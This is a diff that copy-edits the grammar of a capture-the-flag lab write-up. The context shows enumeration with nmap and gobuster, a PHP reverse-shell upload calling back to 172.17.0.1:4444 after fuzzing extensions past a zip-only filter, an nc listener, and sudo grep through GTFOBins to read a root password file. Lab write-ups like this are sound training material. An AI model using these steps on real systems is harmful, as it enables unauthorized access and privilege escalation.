@@ -16,7 +16,7 @@ PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 64
 ```
 
-Next, we use **nmap** default scripts to gather more information about the discovered ports:
+Next, we use **nmap**'s default scripts to gather more information about the discovered ports:
 
 ```shell
 nmap -sCV -p80 172.17.0.2
@@ -31,7 +31,7 @@ We access the website to inspect its content:
 
 ![image](https://github.com/user-attachments/assets/b843c726-78b8-4d8f-8292-0f0adbe4572b)
 
-After reviewing the page code and interacting with it, we did not found relevant information.
+After reviewing the page code and interacting with it, we did not find any relevant information.
 
 We perform **fuzzing** using **gobuster**:
 
@@ -45,12 +45,12 @@ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-l
 /machine.php          (Status: 200) [Size: 1361]
 ```
 
-We discovered the **machine.php** and **upload.php** files and the **uploads** directory.
+We discover the **machine.php** and **upload.php** files, as well as the **uploads** directory.
 
 --------------
 ## Explotation
 
-On reviewing the **machine.php** page, we realized the form allows upload files:
+Upon reviewing the **machine.php** page, we realize that the form allows file uploads:
 
 ![image](https://github.com/user-attachments/assets/6a23ecd1-fdf2-46c0-8566-2e97b447704f)
 
@@ -58,11 +58,11 @@ We prepare the [PHP Pentester monkey reverse shell](https://www.revshells.com/PH
 
 Note that we set the **172.17.0.1** as the **IP** and **4444** as the **PORT** for the listener.
 
-We tried to upload the file and realized the server is restricting uploads to **zip** files
+We try to upload the file and discover the server is restricting uploads to **zip** files
 
 ![image](https://github.com/user-attachments/assets/66e941d2-aeeb-40e6-99bc-e5ac58ed30c6)
 
-Next, we capture the request with [Burp Suite](https://portswigger.net/burp/communitydownload) **Proxy** and perform a new **fuzzing** test with **Intruder** to identify additional allowed **PHP** extensions.
+Next, we capture the request with [Burp Suite](https://portswigger.net/burp/communitydownload) **Proxy** and perform a new **fuzzing** test using **Intruder** to identify additional allowed **PHP** extensions.
 
 ![image](https://github.com/user-attachments/assets/542229d9-2438-45ee-bf33-6bcec04b7608)
 
@@ -80,7 +80,7 @@ nc -lvnp 4444
 listening on [any] 4444 ...
 ```
 
-Next, we execute the **reverse shell** file to gain a shell on the victim's machine:
+Next, we execute the **reverse shell** file to gain a shell on the victim's machine.
 
 Note that the uploaded files are located in the **uploads** directory.
 
@@ -140,7 +140,7 @@ We can run `cut` and `grep` as `root` using [GTFOBins for cut](https://gtfobins.
 
 Note that these binaries do not allow privilege escalation, but they can be used to access a restricted file.
 
-We reviewed the system directories `opt` and `etc` to try to find any hits.
+We review the system directories `opt` and `etc` to try to find any interesting files.
 
 ```shell
 ls /etc/
@@ -171,7 +171,7 @@ cat /opt/nota.txt
 Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
 ```
 
-Next, we tried to access the contents of the **clave.txt** file, but, it is a restricted.
+Next, we try to access the contents of the **clave.txt** file, but, it is restricted.
 
 ```shell
 cat /root/clave.txt
@@ -179,20 +179,20 @@ cat /root/clave.txt
 cat: /root/clave.txt: Permission denied
 ```
 
-Next, we used the [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo) to access the restricted file.
+We then use the [GTFOBins for grep](https://gtfobins.github.io/gtfobins/grep/#sudo) to access the restricted file.
 
 ```shell
 LFILE=/root/clave.txt
 sudo grep '' $LFILE
 ```
 
-We obtained the **root** password, and proceeded to authenticate as **root** using **su**
+We obtain the **root** password and proceed to authenticate as **root** using **su**
 
 ```shell
 su root
 ```
 
-```
+```shell
 whoami
 ----------------
 root
